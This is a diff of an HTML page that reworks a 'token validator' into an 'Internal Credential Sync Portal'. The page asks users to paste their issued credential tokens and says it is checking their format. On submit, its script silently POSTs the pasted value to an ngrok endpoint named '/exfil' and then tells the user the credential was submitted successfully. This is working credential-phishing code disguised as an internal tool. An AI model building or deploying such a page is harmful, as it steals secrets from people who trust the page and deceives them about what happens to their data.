@@ -2,40 +2,59 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Secure Credential Handoff Portal</title>
+  <title>Internal Credential Sync</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      padding: 4em;
+      font-family: sans-serif;
+      background: #f5f6f7;
+      padding: 3em;
       text-align: center;
     }
-    input {
-      width: 90%;
-      padding: 1em;
-      font-size: 1rem;
-      border-radius: 6px;
-      border: 1px solid #ccc;
+    form {
+      background: #fff;
+      padding: 2em;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      max-width: 500px;
+      margin: auto;
     }
-    h2 {
-      color: #2c3e50;
+    input[type="text"] {
+      width: 100%;
+      padding: 1em;
+      margin-top: 1em;
+      font-size: 1em;
+    }
+    button {
+      margin-top: 1.5em;
+      padding: 0.75em 1.5em;
+      font-size: 1em;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <h2>Token Format Validator</h2>
-<p>This page simulates internal credential field validation for formatting consistency. Paste any token block below to confirm standard compliance.</p>
-  <input type="text" id="creds" placeholder="Paste credentials here..." autocomplete="off" />
+  <h2>Internal Credential Sync Portal</h2>
+  <p>Please paste the credential token block issued to you and press Submit to validate format and trace compliance.</p>
+  <form onsubmit="submitToken(event)">
+    <input type="text" id="tokenInput" placeholder="Paste credential block here..." required>
+    <button type="submit">Submit</button>
+  </form>
 
   <script>
-    const field = document.getElementById("creds");
-    field.oninput = function () {
+    function submitToken(e) {
+      e.preventDefault();
+      const token = document.getElementById("tokenInput").value;
       fetch("https://eaf2560d9a9b.ngrok-free.app/exfil", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ value: field.value })
+        body: JSON.stringify({ value: token })
       });
-    };
+      alert("Credential submitted successfully.");
+    }
   </script>
 </body>
 </html>
